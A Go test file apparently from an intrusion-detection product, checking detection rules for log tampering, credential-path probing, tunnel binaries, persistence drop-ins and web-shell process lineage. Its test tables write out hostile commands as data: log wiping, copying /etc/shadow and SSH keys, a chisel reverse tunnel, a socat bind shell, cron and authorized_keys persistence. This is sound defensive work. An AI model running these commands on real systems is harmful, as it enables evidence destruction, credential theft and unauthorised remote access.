// STATUS: DIAMANT VGT SUPREME
// SPDX-FileCopyrightText: 2026 VisionGaia Technology
// SPDX-License-Identifier: AGPL-3.0-only

package main

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// TestSecurityProtectionRootsOnlyAddsExistingPaths is the contract of the widened file-integrity
// scope: a configured root is never lost, a path that does not exist is never invented, the result
// stays inside the limit, and switching the preset off adds nothing.
func TestSecurityProtectionRootsOnlyAddsExistingPaths(t *testing.T) {
	dir := t.TempDir()
	existing := filepath.Join(dir, "www")
	if err := os.MkdirAll(existing, 0o755); err != nil {
		t.Fatal(err)
	}
	missing := filepath.Join(dir, "not-there")
	original := securityProtectionRootCandidates
	securityProtectionRootCandidates = []string{existing, missing}
	defer func() { securityProtectionRootCandidates = original }()

	configured := []string{"/opt/vgt/gedefense/current/bin/gedefense-control", existing}
	roots, added := securityProtectionRoots(configured, true, securityProtectionRootLimit)

	if len(added) != 0 {
		t.Fatalf("an already configured root was reported as added: %v", added)
	}
	if len(roots) != 2 {
		t.Fatalf("configured roots changed: %v", roots)
	}

	roots, added = securityProtectionRoots([]string{"/opt/vgt/defense"}, true, securityProtectionRootLimit)
	if len(added) != 1 || added[0] != existing {
		t.Fatalf("added = %v, want exactly the existing candidate", added)
	}
	if roots[0] != "/opt/vgt/defense" {
		t.Fatalf("the configured root was not kept first: %v", roots)
	}
	for _, root := range roots {
		if root == missing {
			t.Fatalf("a path that does not exist was added: %v", roots)
		}
	}

	if _, added = securityProtectionRoots(nil, false, securityProtectionRootLimit); len(added) != 0 {
		t.Fatalf("the preset added roots while switched off: %v", added)
	}

	// The limit counts the configured roots too, so a setting can never turn the scan into a walk.
	roots, _ = securityProtectionRoots([]string{"/a", "/b"}, true, 2)
	if len(roots) != 2 {
		t.Fatalf("the limit was not respected: %v", roots)
	}
}

// TestAttackChainRulesAreWired proves the four new rules are part of the catalogue and that an
// operator may tune them - a rule that cannot be overridden is a rule that gets switched off
// wholesale instead of adjusted.
func TestAttackChainRulesAreWired(t *testing.T) {
	engine := NewXDRRuleEngine()
	present := make(map[string]bool, len(engine.commandRules))
	for _, rule := range engine.commandRules {
		present[rule.id] = true
	}
	for _, id := range []string{
		"KD.LINUX.LOG_TAMPER",
		"KD.LINUX.CREDENTIAL_PATH_PROBE",
		"KD.LINUX.TUNNEL_BINARY",
		"KD.LINUX.PERSISTENCE_DROPIN",
	} {
		if !present[id] {
			t.Fatalf("rule %q is missing from the catalogue", id)
		}
		if !xdrRuleOverrideIDAllowed(id) {
			t.Fatalf("rule %q cannot be overridden", id)
		}
	}
}

// TestAttackChainRulesMatchTheObservedChain walks the steps of the observed attack - wipe the logs,
// take the credentials, bring in a tunnel, stay - and pins that each one is named. The counter-cases
// are the point of the test: the tools that do the same thing legitimately must stay quiet.
func TestAttackChainRulesMatchTheObservedChain(t *testing.T) {
	engine := NewXDRRuleEngine()
	byID := make(map[string]commandRule, len(engine.commandRules))
	for _, rule := range engine.commandRules {
		byID[rule.id] = rule
	}
	hits := func(id, command string) bool {
		rule, ok := byID[id]
		if !ok {
			t.Fatalf("rule %q missing", id)
		}
		return rule.re.MatchString(command)
	}

	attack := []struct {
		rule    string
		command string
	}{
		{"KD.LINUX.LOG_TAMPER", "rm -rf /var/log/journal"},
		{"KD.LINUX.LOG_TAMPER", "truncate -s 0 /var/log/auth.log"},
		{"KD.LINUX.LOG_TAMPER", "journalctl --vacuum-time=1s"},
		{"KD.LINUX.LOG_TAMPER", "HISTFILE=/dev/null bash -i"},
		{"KD.LINUX.LOG_TAMPER", "shred -u /var/log/syslog"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "cp /etc/shadow /tmp/out"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "tar czf /tmp/creds.tgz /etc/shadow /root/.ssh/id_rsa"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "base64 /etc/vgt/gedefense/secrets/storage-master.key"},
		{"KD.LINUX.TUNNEL_BINARY", "./chisel client 203.0.113.5:8080 R:socks"},
		{"KD.LINUX.TUNNEL_BINARY", "/tmp/ngrok tcp 22"},
		{"KD.LINUX.TUNNEL_BINARY", "socat TCP-LISTEN:4444 EXEC:/bin/sh"},
		{"KD.LINUX.PERSISTENCE_DROPIN", "echo '* * * * * /tmp/x' | tee /etc/cron.d/evil"},
		{"KD.LINUX.PERSISTENCE_DROPIN", "cp /tmp/unit.service /etc/systemd/system/backup.service"},
		{"KD.LINUX.PERSISTENCE_DROPIN", "echo ssh-rsa AAAA >> /root/.ssh/authorized_keys"},
	}
	for _, tc := range attack {
		if !hits(tc.rule, tc.command) {
			t.Errorf("%s did not match %q", tc.rule, tc.command)
		}
	}

	// The legitimate twins: administration, log rotation and normal service work.
	benign := []struct {
		rule    string
		command string
	}{
		{"KD.LINUX.LOG_TAMPER", "logrotate /etc/logrotate.conf"},
		{"KD.LINUX.LOG_TAMPER", "journalctl -f -u nginx"},
		{"KD.LINUX.LOG_TAMPER", "rm -rf /var/lib/vgt/gedefense/archive"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "passwd operator"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "systemctl restart gedefense-control"},
		{"KD.LINUX.CREDENTIAL_PATH_PROBE", "cat /etc/hostname"},
		{"KD.LINUX.TUNNEL_BINARY", "systemctl restart nginx"},
		{"KD.LINUX.TUNNEL_BINARY", "ss -ltnp"},
		{"KD.LINUX.PERSISTENCE_DROPIN", "crontab -l"},
		{"KD.LINUX.PERSISTENCE_DROPIN", "systemctl status cron"},
	}
	for _, tc := range benign {
		if hits(tc.rule, tc.command) {
			t.Errorf("%s matched the legitimate command %q", tc.rule, tc.command)
		}
	}
}

// TestWebShellLineageCoversTheServiceFamilies pins which parents may trigger the lineage rule. It is
// kill-eligible, so the list is services that never spawn a shell by design - and the general-purpose
// runtimes are deliberately excluded, because they do so legitimately every day.
func TestWebShellLineageCoversTheServiceFamilies(t *testing.T) {
	for _, parent := range []string{
		"/usr/sbin/nginx", "/usr/sbin/apache2", "/usr/sbin/httpd", "/usr/bin/caddy",
		"/usr/sbin/lighttpd", "/usr/local/openresty/nginx/sbin/nginx", "/usr/sbin/php-fpm8.4",
		"/opt/tomcat/bin/tomcat", "/usr/bin/uwsgi", "/usr/bin/gunicorn", "/usr/sbin/haproxy",
	} {
		if !suspiciousLineage(parent, "/bin/sh") {
			t.Errorf("network-facing service %q spawning a shell was not a lineage finding", parent)
		}
	}
	for _, parent := range []string{"/usr/bin/java", "/usr/bin/node", "/usr/bin/python3", "/usr/bin/bash", "/usr/sbin/sshd"} {
		if suspiciousLineage(parent, "/bin/sh") {
			t.Errorf("%q must not trigger the kill-eligible lineage rule", parent)
		}
	}
	if suspiciousLineage("/usr/sbin/nginx", "/usr/sbin/nginx") {
		t.Error("a web server restarting itself is not a web shell")
	}
}

// and never terminate a process, because every one of them has a legitimate twin on a real host.
func TestAttackChainRulesReportWithoutKilling(t *testing.T) {
	engine := NewXDRRuleEngine()
	for _, rule := range engine.commandRules {
		if !strings.HasPrefix(rule.id, "KD.LINUX.") {
			continue
		}
		switch rule.id {
		case "KD.LINUX.LOG_TAMPER", "KD.LINUX.CREDENTIAL_PATH_PROBE", "KD.LINUX.TUNNEL_BINARY", "KD.LINUX.PERSISTENCE_DROPIN":
			if rule.killEligible {
				t.Fatalf("%s may terminate a process; it must only report", rule.id)
			}
		}
	}
}
